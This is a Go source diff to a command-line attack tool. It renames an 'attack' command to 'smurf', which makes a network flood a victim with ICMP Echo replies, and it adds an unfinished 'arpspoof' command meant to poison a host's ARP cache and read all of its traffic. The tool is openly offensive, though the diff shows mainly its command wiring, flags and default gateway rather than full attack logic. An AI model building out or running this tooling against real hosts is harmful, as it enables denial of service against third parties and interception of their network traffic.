@@ -13,11 +13,11 @@ import (
 
 var version string // injected at build-time
 
-func attackValidator(ctx *cli.Context) error {
+func smurfValidator(ctx *cli.Context) error {
 	return assertSet(ctx, victimFlag, proxyFlag, ifaceFlag, gatewayFlag)
 }
 
-func attackHandler(ctx *cli.Context) error {
+func smurfHandler(ctx *cli.Context) error {
 	banner := "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"
 
 	victim := net.ParseIP(ctx.String(name(victimFlag)))
@@ -57,17 +57,29 @@ func main() {
 	app.Usage = "carry out a smurf attack!"
 	app.Commands = []cli.Command{
 		{
-			Name:    "attack",
-			Aliases: []string{"r"},
-			Usage:   "carry out a smurf attack against a remote victim",
+			Name:    "smurf",
+			Aliases: []string{"s"},
+			Usage:   "make a network overwhelm a host with ICMP Echo replies",
 			Flags: []cli.Flag{
 				asMandatory(victimFlag),
 				asMandatory(proxyFlag),
-				withDefault(gatewayFlag, "192.168.0.254"),
+				withDefault(gatewayFlag, "192.168.1.254"),
 				withDefault(ifaceFlag, "en0"),
 			},
-			Before: attackValidator,
-			Action: attackHandler,
+			Before: smurfValidator,
+			Action: smurfHandler,
+		},
+		{
+			Name:    "arpspoof",
+			Aliases: []string{"a"},
+			Usage:   "spoof a host's arp cache and read all of their traffic",
+			Flags: []cli.Flag{
+				asMandatory(victimFlag),
+				asMandatory(proxyFlag),
+				withDefault(gatewayFlag, "192.168.1.254"),
+				withDefault(ifaceFlag, "en0"),
+			},
+			// TODO: before and action
 		},
 	}
 	app.CommandNotFound = func(c *cli.Context, command string) {
